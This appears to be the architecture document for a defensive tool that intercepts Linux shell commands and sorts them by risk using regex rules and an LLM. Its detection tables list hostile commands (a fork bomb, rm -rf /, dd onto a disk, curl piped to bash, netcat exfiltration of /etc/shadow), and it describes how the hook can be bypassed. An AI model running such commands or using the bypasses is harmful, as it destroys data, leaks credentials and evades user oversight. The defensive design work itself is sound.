# AI System Intent Engine — Architecture

## System Overview

The AI System Intent Engine is a transparent, user-controlled AI safety layer that intercepts Linux shell commands before execution. It uses a three-tier decision pipeline to classify command intent and risk level, then presents an interactive terminal UI to the user for high-risk commands.

---

## High-Level Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                         User Shell Session                          │
│                                                                      │
│   $ sudo rm -rf /opt/database   ← user presses Enter               │
│          │                                                           │
│          ▼ (Zsh: accept-line ZLE hook, Bash: DEBUG trap)            │
│   Shell hook sends command to daemon via Unix socket                 │
└──────────────────────────┬───────────────────────────────────────────┘
                           │  HTTP POST /analyze
                           │  (Unix domain socket: /tmp/intent_engine.sock)
                           ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     Intent Engine Daemon                            │
│              (FastAPI + Uvicorn, async, single-process)             │
│                                                                      │
│  ┌─────────────┐   ┌──────────────────┐   ┌──────────────────────┐ │
│  │   Command   │   │   Rule Engine    │   │    LLM Reasoner      │ │
│  │   Parser    │──▶│   Tier 0 + 1    │──▶│   Tier 2 (Gemini)    │ │
│  │   (shlex)   │   │   (TOML+regex)  │   │   + LRU Cache (128)  │ │
│  └─────────────┘   └──────────────────┘   └──────────────────────┘ │
│         │                  │                         │              │
│         │          SAFE/HIGH/CRITICAL         AMBIGUOUS only        │
│         │          returned directly           escalated to LLM     │
│         └──────────────────┴─────────────────────────┤             │
│                                                       ▼             │
│                                           ┌──────────────────────┐ │
│                                           │   Verdict Router     │ │
│                                           │   (risk threshold    │ │
│                                           │    comparison)       │ │
│                                           └──────────┬───────────┘ │
└──────────────────────────────────────────────────────│──────────────┘
                                                       │
                   ┌───────────────────────────────────┤
                   │                                   │
                   ▼                                   ▼
         risk >= block_threshold               risk < block_threshold
                   │                                   │
                   ▼                                   ▼
        ┌──────────────────┐               ┌──────────────────────┐
        │   Terminal UI    │               │  Command ALLOWED     │
        │ (ANSI 256-color) │               │  Shell continues     │
        │ Risk + Intent    │               └──────────────────────┘
        │ Safer alt        │
        │ [y/n/s] choice   │
        └────────┬─────────┘
                 │
      ┌──────────┴──────────┐
      │                     │
      ▼                     ▼
 User: [y/s]          User: [n]
 Command executes      Command aborted
      │                     │
      └──────────┬──────────┘
                 ▼
      ┌──────────────────────┐
      │   Audit Logger       │
      │   ~/.intent_engine/  │
      │   logs/audit.jsonl   │
      └──────────────────────┘
```

---

## Three-Tier Decision Pipeline

### Tier 0 — Structural Safety Checks (< 1ms)

Hardcoded regex patterns, zero TOML lookup, always runs first. If matched, the command is immediately returned as `CRITICAL` without invoking any further processing.

**Covered patterns (hardcoded, not configurable):**
| Pattern | Example |
|---------|---------|
| Fork bomb | `:(){ :|:& };:` |
| rm targeting filesystem root | `rm -rf /`, `rm -rf /*` |
| dd writing to raw block device | `dd if=/dev/zero of=/dev/sda` |
| curl-pipe-bash (remote code execution) | `curl http://x.sh \| bash` |
| wget-pipe-bash | `wget -qO- http://x.sh \| sh` |

### Tier 1 — TOML Pattern Library (< 50ms)

A curated library of **41 patterns** loaded from `rules/dangerous_patterns.toml`. Each pattern carries:
- `name`: unique identifier
- `tier`: 0 or 1
- `risk_level`: CRITICAL / HIGH / MEDIUM / LOW
- `category`: destruction / storage / privilege / network / exposure / tampering / execution
- `regex`: tested against the full raw command
- `flags_required`: all flags that must be present
- `path_pattern`: optional path-level regex
- `reasoning_template`: plain-language explanation
- `impact_template`: one-sentence impact for user display
- `safer_alternative`: suggested safer command

**Confidence Scoring:**
Each Tier 1 match generates a confidence score (0.0–1.0) based on:
- Base pattern confidence
- `is_sudo`: +0.15
- Path targeting critical system prefix: +0.20
- Flags present: +0.10 per relevant flag
- CWD proximity to dangerous path: +0.05

If confidence ≥ threshold → return verdict directly  
If confidence < threshold → return `AMBIGUOUS` → escalate to Tier 2

**Pattern Categories (Tier 1):**
| Category | Example Patterns |
|----------|-----------------|
| destruction | `rm -rf` on `/var`, `/etc`, `/home` |
| storage | Shred, secure-delete, disk overwrite |
| privilege | `chmod 777 /etc`, `visudo` modification |
| network | `nc` with data piping, exfil via curl |
| exposure | `cat /etc/shadow`, `/proc/kcore` access |
| tampering | History wipe, `.bashrc` modification |
| execution | Base64-encoded scripts, obfuscated eval |

### Tier 2 — LLM Semantic Reasoning (< 2s with Gemini)

Only invoked when Tier 1 returns `AMBIGUOUS`. Sends a structured prompt to the configured LLM provider.

**LRU Cache:** A session-scoped 128-entry LRU cache ensures repeated commands are answered in < 1ms without re-calling the API.

**Response Schema (strict JSON):**
```json
{
  "risk_level": "HIGH",
  "confidence": 0.91,
  "intent": "Permanently deletes the /opt/custom_app_database directory",
  "impact_summary": "All database files, configurations, and indexes will be unrecoverably destroyed.",
  "reasoning": "sudo + rm -rf targeting /opt/ indicates an administrative destructive operation.",
  "safer_alternative": "mv /opt/custom_app_database /opt/custom_app_database.bak",
  "safer_alternative_explanation": "Moves the directory to a backup location instead of deleting it."
}
```

---

## Component Architecture

### Command Parser (`engine/parser/`)

Parses raw shell input into a structured `ParsedCommand` AST.

```
raw: "sudo rm -rf /opt/db && echo done"
          │
          ▼
     ParsedCommand
       .base_command = "rm"
       .args = ["-rf", "/opt/db"]
       .flags = {"-r": True, "-f": True}
       .is_sudo = True
       .chain_segments = [seg1("rm -rf /opt/db"), seg2("echo done")]
       .target_paths = ["/opt/db"]
       .redirects = []
       .pipes = []
```

**Handles:**
- Pipelines (`cmd1 | cmd2`)
- Chained commands (`&&`, `||`, `;`)
- Subshell expansion (`$(...)`, `` `...` ``)
- Redirections (`>`, `>>`, `2>&1`)
- Alias resolution
- Quote and escape handling

### Rule Engine (`engine/rule_engine/`)

```
PatternLoader  →  loads and validates dangerous_patterns.toml on startup
     │
     ▼
PatternMatcher →  runs Tier 0 structural checks first
     │            then iterates Tier 1 TOML patterns
     │            computes confidence-weighted verdict
     ▼
ObfuscationDetector → catches base64, hex, variable-expansion tricks
     │
     ▼
VerdictBuilder →  constructs final Verdict object with impact/alternatives
```

### LLM Reasoner (`engine/llm/`)

```
LLMClientFactory  →  resolves provider from config ("gemini" | "ollama" | "openai")
     │
     ▼
GeminiClient      →  google-genai SDK, async via executor
     │
     ▼
PromptBuilder     →  constructs system + user prompts from ParsedCommand
     │
     ▼
ResponseParser    →  validates JSON schema, handles partial responses
     │
     ▼
SaferAlternativeSuggester → curated lookup table + LLM fallback (no 2nd API call)
     │
     ▼
_LRUVerdictCache  →  128-entry session cache, MD5 key on raw command
```

### Terminal UI (`engine/ui/terminal_ui.py`)

Reads the daemon JSON response from stdin, renders the ANSI 256-color confirmation prompt to stderr, reads user input from `/dev/tty` (bypasses stdin redirect), and prints the decision (`EXECUTE`, `ABORT`, `USE_SAFER`) to stdout for the shell hook to consume.

### Audit Logger (`engine/audit/`)

Appends a structured JSONL record for every flagged command to `~/.intent_engine/logs/audit.jsonl`. Records include timestamp, command, risk level, confidence, pattern, tier, user action, user, cwd, session ID, and latency.

---

## Shell Integration

### Zsh Hook (`hooks/intent_hook.zsh`)

```zsh
# Overrides the ZLE accept-line widget
# Fires synchronously before execution — cannot be bypassed by normal shell usage
function _intent_accept_line() {
    # 1. Send command to daemon via curl --unix-socket
    # 2. If should_block = true → pipe response to terminal_ui.py
    # 3. Read user decision
    # 4. EXECUTE / ABORT / USE_SAFER based on decision
}
zle -N accept-line _intent_accept_line
```

**Zsh hook guarantees:**
- Fires before any execution (synchronous ZLE override)
- Works with pipelines, chained commands, and aliases
- Can be bypassed per-command with `INTENT_ENGINE_ENABLED=0`

### Bash Hook (`hooks/intent_hook.bash`)

```bash
# Uses DEBUG trap — fires before each command
trap '_intent_check "$BASH_COMMAND"' DEBUG
```

**Known limitation:** Bash `DEBUG` trap is not truly synchronous for all command types. In complex scripts, some commands may execute before the trap fires.

---

## Data Flow Diagram

```
User Input
    │
    ▼
[Shell Hook] ──────────────────────────► [Daemon: /analyze endpoint]
                  HTTP POST                         │
                  Unix Socket                       │
                                          ┌─────────▼──────────┐
                                          │  Command Parser    │
                                          │  shlex + AST       │
                                          └─────────┬──────────┘
                                                    │
                                          ┌─────────▼──────────┐
                                          │  Pre-scan (Tier 0) │
                                          │  Full raw command  │
                                          └─────────┬──────────┘
                                                    │
                                          CRITICAL? YES ──► Return CRITICAL verdict
                                                    │ NO
                                                    │
                                          ┌─────────▼──────────┐
                                          │  Tier 1: Pattern   │
                                          │  Library (TOML)    │
                                          │  Per chain segment │
                                          └─────────┬──────────┘
                                                    │
                                          AMBIGUOUS? NO ──► Return verdict
                                                    │ YES
                                                    │
                                          ┌─────────▼──────────┐
                                          │  Tier 2: Gemini    │
                                          │  LRU cache check   │
                                          │  LLM if cache miss │
                                          └─────────┬──────────┘
                                                    │
                                          ┌─────────▼──────────┐
                                          │  Verdict Router    │
                                          │  Compare to        │
                                          │  block_threshold   │
                                          └─────────┬──────────┘
                                                    │
                                     ┌──────────────┴─────────────┐
                                     │                            │
                              should_block=true            should_block=false
                                     │                            │
                                     ▼                            ▼
                             [Hook: run terminal_ui]      [Hook: allow execution]
                                     │
                             [User: y/n/s]
                                     │
                             [Audit Logger]
```

---

## Performance Characteristics

| Scenario | Latency | Notes |
|----------|---------|-------|
| Tier 0 match (fork bomb, rm -rf /) | < 1ms | Pure regex, no I/O |
| Tier 1 match (TOML pattern) | 5–50ms | Pattern scan + confidence scoring |
| Tier 2 cache hit (LRU) | < 1ms | MD5 hash lookup |
| Tier 2 cache miss (Gemini API) | 500ms–2s | Depends on network, Gemini load |
| Tier 2 cache miss (Ollama, GPU) | 2–5s | Depends on model size + VRAM |
| Tier 2 cache miss (Ollama, CPU) | 30–90s | Not recommended for production |

---

## LLM Provider Details

| Provider | Model | SDK | Latency | Setup |
|----------|-------|-----|---------|-------|
| **Gemini (default)** | gemini-3.6-flash | `google-genai` | ~800ms–2s | API key via `INTENT_GEMINI_API_KEY` |
| Ollama (local) | any GGUF model | `httpx` (REST) | 2–90s | `ollama serve` + model pull |
| OpenAI | gpt-4o-mini | `openai` SDK | ~1–3s | API key via `INTENT_OPENAI_API_KEY` |

**No fine-tuning is applied to any model.** All models are used with carefully engineered prompts via zero-shot prompting. The Gemini model is not customized — it is the standard `gemini-3.6-flash` endpoint provided by Google AI Studio.

---

## Security Model

**What the engine protects against:**
- Accidental execution of catastrophically destructive commands
- Common one-liner attacks (`curl | bash`, reverse shells via `nc`)
- Credential exfiltration (`cat /etc/shadow | nc ...`)
- History tampering (`history -c`)
- Obfuscated commands (base64, hex encoding)

**What the engine does NOT protect against:**
- Kernel exploits or root-level privilege escalation
- Commands executed outside the monitored shell (other terminals, cron jobs, scripts)
- A determined attacker with shell access who can `unset` the hook
- Compiled binaries or direct syscalls bypassing the shell entirely
